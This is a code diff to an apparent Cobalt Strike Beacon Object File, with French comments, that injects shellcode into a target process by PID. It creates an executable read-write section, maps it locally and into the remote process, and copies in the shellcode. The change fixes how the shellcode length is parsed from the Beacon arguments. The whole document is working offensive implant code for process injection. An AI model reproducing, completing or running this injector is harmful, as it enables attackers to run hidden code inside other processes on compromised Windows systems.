@@ -11,7 +11,7 @@ typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 #define ViewShare 1
 
-void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
+void inject(const int pid, const CHAR* shellcode, SIZE_T shellcodeSize) {
     BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
         shellcode[0], shellcode[1], shellcode[2], shellcode[3]);
     BeaconPrintf(CALLBACK_OUTPUT, "pid: %d\n", pid);
@@ -34,7 +34,7 @@ void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
 
 	// section RWX (pas ouf je pense)
     HANDLE hSection = NULL;
-    LARGE_INTEGER sectionSize = { .QuadPart = shellcodeLen };
+    LARGE_INTEGER sectionSize = { .QuadPart = shellcodeSize };
     NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
         PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (!NT_SUCCESS(status)) {
@@ -72,7 +72,7 @@ void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
     BeaconPrintf(CALLBACK_OUTPUT, "remoteView = %p\n", remoteView);
 
     // copier le shellcode dans la vue locale -> visible dans la vue remote automatiquement
-    MSVCRT$memcpy(localView, shellcode, shellcodeLen);
+    MSVCRT$memcpy(localView, shellcode, shellcodeSize);
     BeaconPrintf(CALLBACK_OUTPUT, "shellcode copied to section\n");
 
     // unmap la vue locale (plus necessaire)
@@ -102,19 +102,18 @@ void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
 #ifdef BOF
 VOID go(IN PCHAR Buffer, IN ULONG Length)
 {
-    int pid = 0;
-    BYTE* shellcode = NULL;
-    int shellcodeLen = 0;
-
     datap parser;
     BeaconDataParse(&parser, Buffer, Length);
-    pid = BeaconDataInt(&parser);
-    shellcode = BeaconDataExtract(&parser, NULL);
-    shellcodeLen = BeaconDataInt(&parser);
+
+
+    DWORD pid = BeaconDataInt(&parser);
+    int shellcodeSizeInt = 0;
+    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
+    SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;
 
     if (!bofstart()) return;
 
-    inject(pid, shellcode, shellcodeLen);
+    inject(pid, shellcode, shellcodeSize);
 
     printoutput(TRUE);
     bofstop();
